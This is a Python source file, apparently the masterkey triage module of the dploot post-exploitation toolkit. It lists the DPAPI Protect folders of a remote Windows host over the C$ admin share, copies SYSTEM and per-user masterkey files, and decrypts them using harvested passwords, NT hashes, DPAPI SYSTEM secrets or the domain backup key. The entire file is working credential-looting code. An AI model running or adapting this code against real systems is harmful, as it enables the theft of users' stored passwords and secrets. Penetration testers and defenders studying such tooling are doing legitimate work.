import logging
import ntpath
from typing import Any, Dict, List, Optional

from dploot.triage import Triage
from dploot.lib.masterkey import Masterkey
from dploot.lib.target import Target
from dploot.lib.utils import is_guid, find_guid, find_sha1, parse_file_as_list
from dploot.lib.network import DPLootConnection


def parse_masterkey_file(filename) -> List[Masterkey]:
    masterkeys = []
    masterkeys_lines = parse_file_as_list(filename)
    for masterkey in masterkeys_lines:
        guid, sha1 = masterkey.split(":", 1)
        masterkeys.append(
            Masterkey(
                guid=find_guid(guid),
                sha1=find_sha1(sha1),
            )
        )
    return masterkeys


class MasterkeysTriage(Triage):
    user_masterkeys_generic_path = "AppData\\Roaming\\Microsoft\\Protect"
    system_masterkeys_generic_path = "Windows\\System32\\Microsoft\\Protect"
    share = "C$"
        
    def __init__(
        self,
        target: Target,
        conn: DPLootConnection,
        pvkbytes: Optional[bytes] = None,
        passwords: Optional[Dict[str, str]] = None,
        nthashes: Optional[Dict[str, str]] = None,
        dpapiSystem: Optional[Dict[str, str]] = None,
        per_masterkey_callback: Any = None,
        false_positive: List[str] | None = None,
    ) -> None:
        super().__init__(
            target, 
            conn,
            per_loot_callback=per_masterkey_callback,
            false_positive=false_positive,
        )
        self.pvkbytes = pvkbytes
        self.passwords = passwords
        self.nthashes = nthashes

        self.all_looted_masterkeys = []
        self.dpapiSystem = dpapiSystem
        if self.dpapiSystem is None:
            self.dpapiSystem = {}
        # should be {"MachineKey":"key","Userkey":"key"}

    def triage_system_masterkeys(self) -> List[Masterkey]:
        masterkeys = []
        if len(self.dpapiSystem) == 0:
            self.dpapiSystem = self.conn.get_dpapi_system_keys(self.looted_files)
        if self.dpapiSystem is None or len(self.dpapiSystem) != 2:
            logging.debug("Could not get DPAPI SYSTEM keys")
            return masterkeys
        system_protect_dir = self.conn.list_dir(
            path=self.system_masterkeys_generic_path, share=self.share
        )
        for d in system_protect_dir:
            if (
                d not in self.false_positive
                and d.is_directory() > 0
                and d.get_longname()[:2].upper() == "S-"
            ):  # could be a better way to deal with sid
                sid = d.get_longname().upper()
                system_protect_dir_sid_path = ntpath.join(
                    self.system_masterkeys_generic_path, sid
                )
                system_sid_dir = self.conn.list_dir(
                    share=self.share, path=system_protect_dir_sid_path
                )
                for f in system_sid_dir:
                    if f.is_directory() == 0 and is_guid(f.get_longname()):
                        guid = f.get_longname()
                        filepath = ntpath.join(system_protect_dir_sid_path, guid)
                        logging.debug(
                            f"Found SYSTEM system MasterKey: \\\\{self.target.address}\\{self.share}\\{filepath}"
                        )
                        # read masterkey
                        masterkey_bytes = self.conn.read_file(share=self.share, path=filepath, looted_files=self.looted_files)
                        if masterkey_bytes is not None:
                            masterkey = Masterkey(
                                guid=guid,
                                blob=masterkey_bytes,
                                sid=sid,
                                user="SYSTEM"
                            )
                            self.all_looted_masterkeys.append(masterkey)
                            if masterkey.decrypt(dpapi_systemkey=self.dpapiSystem):
                                masterkeys.append(masterkey)
                                if self.per_loot_callback is not None:
                                    self.per_loot_callback(masterkey)
                    elif f.is_directory() > 0 and f.get_longname().upper() == "USER":
                        system_protect_dir_user_path = ntpath.join(
                            system_protect_dir_sid_path, f.get_longname()
                        )
                        system_user_dir = self.conn.list_dir(
                            share=self.share, path=system_protect_dir_user_path
                        )
                        for g in system_user_dir:
                            if g.is_directory() == 0 and is_guid(g.get_longname()):
                                guid = g.get_longname()
                                filepath = ntpath.join(
                                    system_protect_dir_user_path, guid
                                )
                                logging.debug(
                                    f"Found SYSTEM user MasterKey: \\\\{self.target.address}\\{self.share}\\{filepath}"
                                )
                                # read masterkey
                                masterkey_bytes = self.conn.read_file(
                                    share=self.share, path=filepath, looted_files=self.looted_files
                                )
                                if masterkey_bytes is not None:
                                    masterkey = Masterkey(
                                        guid=guid,
                                        blob=masterkey_bytes,
                                        sid=sid,
                                        user="SYSTEM_User"
                                    )
                                    self.all_looted_masterkeys.append(masterkey)
                                    if masterkey.decrypt(dpapi_systemkey=self.dpapiSystem):
                                        masterkeys.append(masterkey)
                                        if self.per_loot_callback is not None:
                                            self.per_loot_callback(masterkey)
        return masterkeys

    def triage_masterkeys(self) -> List[Masterkey]:
        masterkeys = []
        for user in self.users:
            try:
                masterkeys += self.triage_masterkeys_for_user(user)
            except Exception as e:
                if logging.getLogger().level == logging.DEBUG:
                    import traceback

                    traceback.print_exc()
                    logging.debug(str(e))
        return masterkeys

    def triage_masterkeys_for_user(self, user: str) -> List[Masterkey]:
        masterkeys = []
        user_masterkey_path = ntpath.join(
            ntpath.join("Users", user), self.user_masterkeys_generic_path
        )
        user_protect_dir = self.conn.list_dir(
            share=self.share, path=user_masterkey_path
        )
        if (
            user_protect_dir is None
        ):  # Yes, it's possible that users have an AppData tree but no Protect folder
            return masterkeys
        for d in user_protect_dir:
            if (
                d not in self.false_positive
                and d.is_directory() > 0
                and d.get_longname()[:2].upper() == "S-"
            ):  # could be a better way to deal with sid
                sid = d.get_longname().upper()
                user_masterkey_path_sid = ntpath.join(
                    ntpath.join(
                        ntpath.join("Users", user), self.user_masterkeys_generic_path
                    ),
                    sid,
                )
                user_sid_dir = self.conn.list_dir(
                    path=user_masterkey_path_sid
                )
                for f in user_sid_dir:
                    if f.is_directory() == 0 and is_guid(f.get_longname()):
                        guid = f.get_longname()
                        filepath = ntpath.join(user_masterkey_path_sid, guid)
                        logging.debug(
                            f"Found MasterKey: \\\\{self.target.address}\\{self.share}\\{filepath}"
                        )
                        # read masterkey
                        masterkey_bytes = self.conn.read_file(path=filepath, looted_files=self.looted_files)
                        if masterkey_bytes is not None:
                            password = None
                            nthash = None
                            if (
                                self.passwords is not None
                                and user.lower() in self.passwords
                            ):
                                password = self.passwords[user.lower()]
                            elif (
                                self.passwords is not None
                                and user.rpartition(".")[0].lower() in self.passwords
                            ):
                                password = self.passwords[
                                    user.rpartition(".")[0].lower()
                                ]  # In case of duplicate (like admin and admin.waza) on usernames in c:\Users\
                            if (
                                self.nthashes is not None
                                and user.lower() in self.nthashes
                            ):
                                nthash = self.nthashes[user.lower()]
                            elif (
                                self.nthashes is not None
                                and user.rpartition(".")[0].lower() in self.nthashes
                            ):
                                nthash = self.nthashes[user.rpartition(".")[0].lower()]
                            masterkey = Masterkey(
                                guid=guid,
                                blob=masterkey_bytes,
                                sid=sid,
                                user=user,
                            )
                            self.all_looted_masterkeys.append(masterkey)
                            if masterkey.decrypt(
                                domain_backupkey=self.pvkbytes,
                                password=password,
                                nthash=nthash,
                            ):
                                masterkeys.append(masterkey)
                                if self.per_loot_callback is not None:
                                    self.per_loot_callback(masterkey)
        return masterkeys
